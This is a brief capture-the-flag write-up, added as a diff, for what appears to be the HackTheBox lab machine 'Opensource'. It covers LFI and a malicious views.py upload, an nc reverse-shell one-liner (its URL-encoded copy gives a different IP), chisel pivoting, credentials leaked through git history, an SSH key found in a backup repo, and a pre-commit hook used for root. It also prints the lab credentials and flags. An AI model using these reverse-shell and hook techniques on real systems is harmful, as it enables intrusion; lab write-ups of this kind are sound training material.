@@ -1,0 +1,34 @@
+Opensource Writeup
+
+scanned with nmap, found ports 22, 80, 3000
+port 80 is a website with repo download of the source and file upload
+is vulnerable for LFI
+uploaded a modified views.py in order to get a shell
+
+crafted request for /exec new endpoint like this:
+python3 -c "import urllib.parse; print(urllib.parse.quote('rm /tmp/f;mkfifo
+/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.37 1337 >/tmp/f'))"
+rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-
+i%202%3E%261%7Cnc%2010.10.14.184%201337%20%3E/tmp/f
+
+used the crafted rev shell as paramenter of the shell endpoint call and got a shell
+
+found host ip 172.17.0.1
+found port 3000 has a git repo management page Gitea.
+
+set up with chisel a proxy from kali (server) and target (client) via socks5
+set up the proxy for firefox and reeched gitea at http://172.17.0.1:3000/
+
+found in git log of the dowloaded upcloud source some creds:
+dev01:Soulless_Developer#2022
+
+logged into Gitea with that creds and found a "home_backup" repo
+in home_backup repo found a .ssh folder with a private key
+
+connected via ssh to opensource.htb got user flag
+c04e7379bb4ab063aea6c3d1321d2846
+
+enumerate the target, with pspy found a cron which makes a commit every minute.
+used an hook in /home/dev01/.git/hooks/pre-commit to start a rev shell.
+got a shell as root
+a3c4c37dd65028af8fafdf298d1246f9
